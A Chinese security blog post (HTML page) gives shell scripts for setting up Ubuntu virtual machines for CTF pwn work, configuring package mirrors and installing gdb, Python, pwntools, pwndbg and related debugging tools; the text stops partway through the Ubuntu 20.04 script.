<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ctf环境配置 | H4wk1ns's blog</title><meta name="keywords" content="设置,信息安全"><meta name="author" content="H4wk1ns"><meta name="copyright" content="H4wk1ns"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言  为了方便，将CTF的环境配置进行总结，方便日后快速恢复环境等 PWN环境  由于一般PWN题目涉及到各种Glibc版本，这里搭建多个虚拟机，下面给出主要版本下的虚拟机安装 ubuntu16.04  其安装脚本如下所示  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf环境配置">
<meta property="og:url" content="https://jiaweihawk.github.io/2021/07/21/ctf%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/index.html">
<meta property="og:site_name" content="H4wk1ns&#39;s blog">
<meta property="og:description" content="前言  为了方便，将CTF的环境配置进行总结，方便日后快速恢复环境等 PWN环境  由于一般PWN题目涉及到各种Glibc版本，这里搭建多个虚拟机，下面给出主要版本下的虚拟机安装 ubuntu16.04  其安装脚本如下所示  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jiaweihawk.github.io/img/background.jpg">
<meta property="article:published_time" content="2021-07-21T13:21:25.000Z">
<meta property="article:modified_time" content="2024-10-16T15:08:39.033Z">
<meta property="article:author" content="H4wk1ns">
<meta property="article:tag" content="设置">
<meta property="article:tag" content="信息安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiaweihawk.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jiaweihawk.github.io/2021/07/21/ctf%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctf环境配置',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-16 23:08:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><link rel="stylesheet" href="/static/css/custom.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">H4wk1ns's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctf环境配置</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-21T13:21:25.000Z" title="发表于 2021-07-21 21:21:25">2021-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-16T15:08:39.033Z" title="更新于 2024-10-16 23:08:39">2024-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>54分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctf环境配置"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  为了方便，将CTF的环境配置进行总结，方便日后快速恢复环境等</p>
<h1 id="PWN环境"><a href="#PWN环境" class="headerlink" title="PWN环境"></a>PWN环境</h1><p>  由于一般PWN题目涉及到各种<strong>Glibc</strong>版本，这里搭建多个虚拟机，下面给出主要版本下的虚拟机安装</p>
<h2 id="ubuntu16-04"><a href="#ubuntu16-04" class="headerlink" title="ubuntu16.04"></a>ubuntu16.04</h2><p>  其安装脚本如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository -y ppa:brightbox/ruby-ng \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y libffi-dev libsqlite3-dev libbz2-dev liblzma-dev zlib1g-dev tk-dev libncursesw5-dev libgdbm-dev openssl libssl-dev libreadline-dev uuid-dev \</span><br><span class="line">    texinfo \</span><br><span class="line">    patchelf strace \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl xsel \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.8.10/Python-3.8.10.tar.xz \</span><br><span class="line">    &amp;&amp; tar -xvf Python-3.8.10.tar.xz -C ~ \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf Python-3.8.10.tar.xz \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/Python-3.8.10 &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build &amp;&amp; ../configure --enable-shared --exec-prefix=/usr &amp;&amp; make -j $(<span class="built_in">nproc</span>) &amp;&amp; <span class="built_in">sudo</span> make -j $(<span class="built_in">nproc</span>) install) \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python3 python3 /usr/local/bin/python3.8 150 \</span><br><span class="line">    &amp;&amp; wget https://bootstrap.pypa.io/get-pip.py \</span><br><span class="line">    &amp;&amp; python3 get-pip.py --user \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf get-pip.py \</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.xz \</span><br><span class="line">    &amp;&amp; tar -xvf gdb-9.2.tar.xz -C ~ \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf gdb-9.2.tar.xz \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/gdb-9.2 &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build &amp;&amp; ../configure --with-python=/usr/bin/python3 &amp;&amp; make -j $(<span class="built_in">nproc</span>) &amp;&amp; <span class="built_in">sudo</span> make -j $(<span class="built_in">nproc</span>) install) \</span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line">wget -O ~/nvim.appimage https://ghproxy.com/https://github.com/neovim/neovim/releases/download/stable/nvim.appimage \</span><br><span class="line">    &amp;&amp; <span class="built_in">chmod</span> +x ~/nvim.appimage \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> <span class="built_in">ln</span> -sf ~/nvim.appimage /usr/bin/vi \</span><br><span class="line">    &amp;&amp; <span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set clipboard+=unnamedplus</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y ruby2.6 ruby2.6-dev \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="ubuntu18-04"><a href="#ubuntu18-04" class="headerlink" title="ubuntu18.04"></a>ubuntu18.04</h2>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository -y ppa:brightbox/ruby-ng \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim xsel \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set clipboard+=unnamedplus</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y ruby2.6 ruby2.6-dev \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ubuntu20-04"><a href="#ubuntu20-04" class="headerlink" title="ubuntu20.04"></a>ubuntu20.04</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    ruby ruby-dev \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim \</span><br><span class="line">    qemu-system docker 